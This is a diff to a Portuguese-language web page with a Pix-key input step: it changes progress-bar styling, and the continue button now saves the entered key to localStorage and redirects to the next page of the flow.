@@ -70,7 +70,7 @@
         .progress-bar .progress {
             content: "";
             display: block;
-            width: 0%;
+            width: 30%;
             height: 100%;
             background: black;
             transition: width 1s ease;
@@ -155,11 +155,6 @@
             cursor: pointer;
         }
 
-        .button:focus {
-            outline: none;
-        }
-
-        /* Loader (spinner) */
         .loader {
             display: none;
             width: 16px;
@@ -175,7 +170,6 @@
             display: inline-block;
         }
 
-        /* Esconde o texto do botão quando estiver carregando */
         .button.loading span {
             display: none;
         }
@@ -218,11 +212,6 @@
 </div>
 
 <script>
-    window.onload = function() {
-        const progressElement = document.querySelector('.progress');
-        progressElement.style.width = '30%';
-    };
-
     function validateInput() {
         let inputField = document.getElementById("pix-input");
         let continueButton = document.getElementById("continue-button");
@@ -240,14 +229,20 @@
         let continueButton = document.getElementById("continue-button");
         let loader = continueButton.querySelector(".loader");
         let buttonText = continueButton.querySelector("span");
+        let pixInput = document.getElementById("pix-input").value.trim();
 
-        continueButton.classList.add("loading");  
-        loader.style.display = "inline-block"; // Mostra o loader
-        buttonText.style.display = "none"; // Esconde o texto do botão
+        if (pixInput.length > 0) {
+            // Salvar chave Pix no localStorage
+            localStorage.setItem("chavePix", pixInput);
 
-        setTimeout(() => {
-            window.location.href = "https://so2-market-data.vercel.app/PixP3.html"; // Redireciona após 1 segundo
-        }, 700);
+            continueButton.classList.add("loading");  
+            loader.style.display = "inline-block";
+            buttonText.style.display = "none";
+
+            setTimeout(() => {
+                window.location.href = "https://so2-market-data.vercel.app/PixP3.html";
+            }, 1000);
+        }
     }
 </script>
 
